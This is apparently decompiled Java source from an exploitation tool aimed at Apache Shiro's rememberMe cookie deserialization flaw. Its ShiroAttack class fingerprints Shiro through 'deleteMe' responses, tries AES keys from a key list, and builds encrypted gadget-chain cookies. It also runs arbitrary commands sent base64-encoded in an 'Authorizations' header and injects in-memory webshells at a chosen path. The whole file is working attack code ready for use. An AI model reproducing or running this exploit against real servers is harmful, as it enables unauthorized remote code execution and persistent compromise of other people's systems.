/*
 * Decompiled with CFR 0.152.
 */
package com.sma11new.exp.shiro;

import cn.hutool.core.codec.Base64;
import cn.hutool.core.io.resource.ResourceUtil;
import cn.hutool.core.util.StrUtil;
import com.mchange.v2.ser.SerializableUtils;
import com.sma11new.config.Config;
import com.sma11new.exp.shiro.attack.memShell.MemBytes;
import com.sma11new.exp.shiro.attack.payloads.ObjectPayload;
import com.sma11new.exp.shiro.attack.util.Gadgets;
import com.sma11new.exp.shiro.util.AesUtil;
import com.sma11new.exp.shiro.util.ShiroGCM;
import com.sma11new.utils.HttpMsgUtil;
import com.sma11new.utils.HttpUtils;
import com.sma11new.utils.Response;
import com.sma11new.utils.Tools;
import java.io.NotSerializableException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.bind.DatatypeConverter;
import org.apache.shiro.subject.SimplePrincipalCollection;

public class ShiroAttack {
    private static HashMap<String, String> headers = new HashMap();
    private static int flagCount = 0;
    public static boolean AES_GCM_MODE = false;
    public static boolean complexReq = false;
    public static Map<String, Object> reqMsg = null;

    public static boolean checkIsShiro(String url, String cookieFlag) {
        Response response;
        headers.clear();
        if (!complexReq) {
            headers.put("Cookie", cookieFlag + "=1");
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap)reqMsg.get("headers");
            String data2 = HttpMsgUtil.mapToUrlEncodedString((Map)reqMsg.get("data"));
            headers.put("Cookie", ShiroAttack.getCookie(headers, cookieFlag, "1"));
            response = Objects.equals(reqMsg.get("method"), "POST") ? HttpUtils.post(url, data2, headers, Config.DEFAULT_ENCODING) : HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        flagCount = ShiroAttack.countDeleteMe(response.getHead());
        return flagCount >= 1;
    }

    public static boolean checkKey(String url, String cookieFlag, String key2) {
        Response response;
        headers.clear();
        String cookie = null;
        try {
            cookie = ShiroAttack.buildPayload(key2);
        }
        catch (Exception e2) {
            return false;
        }
        if (!complexReq) {
            headers.put("Cookie", cookieFlag + "=" + cookie);
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap)reqMsg.get("headers");
            String data2 = HttpMsgUtil.mapToUrlEncodedString((Map)reqMsg.get("data"));
            headers.put("Cookie", ShiroAttack.getCookie(headers, cookieFlag, cookie));
            response = Objects.equals(reqMsg.get("method"), "POST") ? HttpUtils.post(url, data2, headers, Config.DEFAULT_ENCODING) : HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        return response.getHeadMap() != null && ShiroAttack.countDeleteMe(response.getHead()) < flagCount;
    }

    public static boolean checkChain(String url, String cookieFlag, String key2, String chain, String echo) {
        Response response;
        headers.clear();
        if (!complexReq) {
            headers.put("Cookie", ShiroAttack.GadgetPayload(chain, echo, key2, cookieFlag));
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap)reqMsg.get("headers");
            String data2 = HttpMsgUtil.mapToUrlEncodedString((Map)reqMsg.get("data"));
            headers.put("Cookie", ShiroAttack.getCookie(headers, cookieFlag, ShiroAttack.GadgetPayload(chain, echo, key2, cookieFlag)));
            response = Objects.equals(reqMsg.get("method"), "POST") ? HttpUtils.post(url, data2, headers, Config.DEFAULT_ENCODING) : HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        return response.getHead().contains("Host");
    }

    public static String execCmd(String url, String cookieFlag, String key2, String chain, String echo, String cmd) {
        Response response;
        headers.clear();
        if (!complexReq) {
            headers.put("Cookie", ShiroAttack.GadgetPayload(chain, echo, key2, cookieFlag));
            headers.put("Authorizations", "Basic " + Base64.encode(cmd));
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap)reqMsg.get("headers");
            String data2 = HttpMsgUtil.mapToUrlEncodedString((Map)reqMsg.get("data"));
            headers.put("Cookie", ShiroAttack.getCookie(headers, cookieFlag, ShiroAttack.GadgetPayload(chain, echo, key2, cookieFlag)));
            headers.put("Authorizations", "Basic " + Base64.encode(cmd));
            response = Objects.equals(reqMsg.get("method"), "POST") ? HttpUtils.post(url, data2, headers, Config.DEFAULT_ENCODING) : HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        if (response.getCode() == 200 && response.getHead().contains("Host")) {
            String result = StrUtil.subBetween(response.getBody(), "BrY3jhHrh6", "yQqlMgS1cL");
            try {
                return Base64.decodeStr(result);
            }
            catch (Exception e2) {
                return e2.getMessage();
            }
        }
        return "\u6267\u884c\u5931\u8d25";
    }

    public static String injectMemShell(String url, String cookieFlag, String key2, String chain, String memShell, String path2, String pass) {
        Response response;
        String shellBody = null;
        try {
            shellBody = "user=" + MemBytes.getBytes(memShell);
        }
        catch (Exception e2) {
            return "\u3010-\u3011 \u6ce8\u5165\u5931\u8d25\uff1a" + e2.getMessage();
        }
        headers.clear();
        if (!complexReq) {
            headers.put("Cookie", ShiroAttack.GadgetPayload(chain, "InjectMemTool", key2, cookieFlag));
            headers.put("path", path2);
            response = HttpUtils.post(url, shellBody, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap)reqMsg.get("headers");
            headers.put("Cookie", ShiroAttack.getCookie(headers, cookieFlag, ShiroAttack.GadgetPayload(chain, "InjectMemTool", key2, cookieFlag)));
            headers.put("path", path2);
            Map dataMap = (Map)reqMsg.get("data");
            dataMap.put("user", MemBytes.getBytes(memShell));
            String data2 = HttpMsgUtil.mapToUrlEncodedString(dataMap);
            response = Objects.equals(reqMsg.get("method"), "POST") ? HttpUtils.post(url, data2, headers, Config.DEFAULT_ENCODING) : HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        if (response.getCode() == 200 && response.getBody().contains("->|Success|<-")) {
            return Tools.extractBaseUrl(url) + path2;
        }
        return "\u3010-\u3011 \u6ce8\u5165\u5931\u8d25\uff1a" + response.getCode();
    }

    public static String buildPayload(String key2) {
        SimplePrincipalCollection principal = new SimplePrincipalCollection();
        byte[] serpayload = new byte[]{};
        try {
            serpayload = SerializableUtils.toByteArray(principal);
        }
        catch (NotSerializableException e2) {
            e2.printStackTrace();
        }
        byte[] bkey = DatatypeConverter.parseBase64Binary(key2);
        String payload = null;
        try {
            payload = DatatypeConverter.printBase64Binary(AesUtil.encrypt(serpayload, bkey));
        }
        catch (Exception e3) {
            e3.printStackTrace();
        }
        return payload;
    }

    public static String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey, String cookieName) {
        String rememberMe = null;
        try {
            Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass(gadgetOpt);
            ObjectPayload gadgetPayload = gadgetClazz.newInstance();
            Object template2 = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template2);
            rememberMe = ShiroAttack.sendpayload(chainObject, cookieName, spcShiroKey);
        }
        catch (Exception var9) {
            var9.printStackTrace();
        }
        return rememberMe;
    }

    public static String sendpayload(Object chainObject, String shiroKeyWord, String key2) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = DatatypeConverter.parseBase64Binary(key2);
        byte[] encryptpayload = null;
        if (AES_GCM_MODE) {
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key2, serpayload);
            return shiroKeyWord + "=" + byteSource;
        }
        encryptpayload = AesUtil.encrypt(serpayload, bkey);
        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
    }

    public static List<String> getAllKeys() {
        String[] keyInputs = new String[]{};
        String keyFromFile = ResourceUtil.readUtf8Str("shiro_keys.txt");
        keyInputs = keyFromFile.split("\n");
        System.out.println(Arrays.asList(keyInputs));
        return Arrays.asList(keyInputs);
    }

    public static int countDeleteMe(String text) {
        Pattern pattern = Pattern.compile("deleteMe");
        Matcher matcher = pattern.matcher(text);
        int count2 = 0;
        while (matcher.find()) {
            ++count2;
        }
        return count2;
    }

    private static String getCookie(HashMap<String, String> headers, String cookieFlag, String attackCookie) {
        attackCookie = StrUtil.removeAll((CharSequence)attackCookie, cookieFlag + "=");
        if (headers.get("Cookie") == null) {
            return cookieFlag + "=" + attackCookie;
        }
        if (headers.get("Cookie").contains(cookieFlag + "=")) {
            StringBuilder cookieRes = new StringBuilder();
            ArrayList<String> cookieArray = new ArrayList<String>(Arrays.asList(headers.get("Cookie").split(";")));
            if (cookieArray.size() == 1) {
                return cookieFlag + "=" + attackCookie;
            }
            for (String cookie : cookieArray) {
                if (cookie.contains(cookieFlag + "=")) continue;
                cookieRes.append(cookie).append("; ");
            }
            cookieRes.append(cookieFlag + "=" + attackCookie);
            return cookieRes.toString();
        }
        return headers.get("Cookie") + "; " + cookieFlag + "=" + attackCookie;
    }
}

